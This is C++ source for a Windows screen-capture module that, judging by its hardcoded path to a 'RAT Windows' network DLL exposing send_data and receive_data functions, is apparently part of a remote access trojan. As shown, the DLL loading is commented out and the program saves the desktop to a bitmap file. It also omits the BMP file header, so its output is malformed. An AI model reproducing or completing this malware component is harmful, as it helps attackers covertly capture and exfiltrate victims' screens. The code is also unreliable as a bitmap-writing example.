// cl /EHsc screen_cap.cpp /link gdi32.lib user32.lib /OUT:screen_cap.exe
#include <windows.h>
#include <iostream>
#include <string>
#include <vector>

using namespace std;

typedef int (*SendDataFunc)(const std::string&, const std::string&);
typedef string (*RecvDataFunc)(const std::string&);
typedef vector<unsigned char> (*RecvDataRawFunc)(const std::string&);

SendDataFunc send_data;
RecvDataFunc receive_data;
RecvDataRawFunc receive_data_raw;

LPCSTR dllPath = "C:\\malware\\RAT Windows\\network_lib.dll";
HINSTANCE hDLL;

int load_dll()
{
    hDLL = LoadLibraryA(dllPath);
    if (hDLL == NULL)
    {
        printf("Failed to load DLL: %d\n", GetLastError());
        return EXIT_FAILURE;
    }

    receive_data_raw = (RecvDataRawFunc)GetProcAddress(hDLL, "?receive_data_raw@@YA?AV?$vector@EV?$allocator@E@std@@@std@@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@@Z");
    receive_data = (RecvDataFunc)GetProcAddress(hDLL, "?receive_data@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEBV12@@Z");
    send_data = (SendDataFunc)GetProcAddress(hDLL, "?send_data@@YAHAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@0@Z");

    if (!receive_data || !send_data || !receive_data_raw)
    {
        std::cerr << "Failed to get one or more function addresses.\n";
        FreeLibrary(hDLL);
        return 1;
    }

    return 0;
}

int main()
{

    // if (load_dll() != 0)return 1;
    // cout << "DLL loaded successfully.\n";

    // Get a handle to the desktop window.
    HWND hWnd = GetDesktopWindow();

    // Get the dimensions of the screen.
    RECT rect;
    GetWindowRect(hWnd, &rect);
    int width = rect.right - rect.left;
    int height = rect.bottom - rect.top;

    // Create a compatible DC for the screen.
    HDC hdcScreen = GetDC(NULL);
    HDC hdcMemDC = CreateCompatibleDC(hdcScreen);

    // Create a bitmap to hold the screenshot.
    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, width, height);

    // Select the bitmap into the memory DC.
    SelectObject(hdcMemDC, hBitmap);

    // BitBlt the screen to the memory DC.
    BitBlt(hdcMemDC, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY);

    // Create a file for saving the screenshot.
    HANDLE hFile = CreateFileW(L"screenshot.bmp", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    // Get the bitmap information.
    BITMAPINFOHEADER bi;
    memset(&bi, 0, sizeof(BITMAPINFOHEADER));
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = width;
    bi.biHeight = -height; // Negative height indicates top-down bitmap
    bi.biPlanes = 1;
    bi.biBitCount = 24; // 24 bits per pixel (RGB)
    bi.biCompression = BI_RGB;

    // Write the bitmap header to the file.
    DWORD dwBytesWritten;
    WriteFile(hFile, &bi, sizeof(BITMAPINFOHEADER), &dwBytesWritten, NULL);

    // Get the bitmap data.
    BITMAPINFO bmi;
    bmi.bmiHeader = bi;
    GetDIBits(hdcScreen, hBitmap, 0, height, NULL, &bmi, DIB_RGB_COLORS);

    // Allocate memory for the bitmap data.
    int bmpSize = ((width * bi.biBitCount + 31) / 32) * 4 * height;
    vector<unsigned char> bmpData(bmpSize);
    
    // Get the bitmap data.
    GetDIBits(hdcScreen, hBitmap, 0, height, bmpData.data(), &bmi, DIB_RGB_COLORS);
    
    // Write the bitmap data to the file.
    WriteFile(hFile, bmpData.data(), bmpSize, &dwBytesWritten, NULL);

    // Clean up.
    DeleteObject(hBitmap);
    DeleteDC(hdcMemDC);
    ReleaseDC(NULL, hdcScreen);
    CloseHandle(hFile);
    // FreeLibrary(hDLL);
    // cout << "\nDll Unloaded.\n";
    return 0;
}